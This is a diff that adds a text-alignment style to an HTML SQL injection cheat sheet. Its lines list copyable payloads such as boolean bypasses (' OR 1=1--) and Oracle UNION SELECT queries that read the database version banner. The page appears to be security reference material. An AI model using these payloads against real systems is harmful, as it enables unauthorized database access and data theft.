@@ -56,7 +56,7 @@
 If the vulnerability is present the goal is to "cut" the query and retrieve all, for that boolean 
 conditions are used.
 <div class='parent'>
-<div class='child inline-block-child'><p id="HDT01"><mark>' OR 1=1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT01')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="HDT01" style="text-align:left"><mark>' OR 1=1--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT01')">ctrl+C</button></div>
 <div class='child inline-block-child'><p id="HDT02"><mark>' and 'a'='a--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT02')">ctrl+C</button></div>
 <div class='child inline-block-child'><p id="HDT03"><mark>' and 1=2;--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#HDT03')">ctrl+C</button></div></p></div>
 </details>
@@ -94,7 +94,7 @@ is needed. Also, for ORACLE the select statement is needed a table to search fro
 
 <b>ORACLE:</b>
 <div class='parent'>
-<div class='child inline-block-child'><p id="DTT06"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT06')">ctrl+C</button></div>
+<div class='child inline-block-child'><p id="DTT06" style="text-align:left"><mark>' UNION SELECT 'a','a' FROM DUAL--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT06')">ctrl+C</button></div>
 <div class='child inline-block-child'><p id="DTT07"><mark>' UNION SELECT banner,NULL FROM v$version--</mark></p></div> | <div class='child inline-block-child'><button class="button_conf button_set" onclick="ctrl_C('#DTT07')">ctrl+C</button></div>
 *assuming it has two columns and both are type string.
 </div>
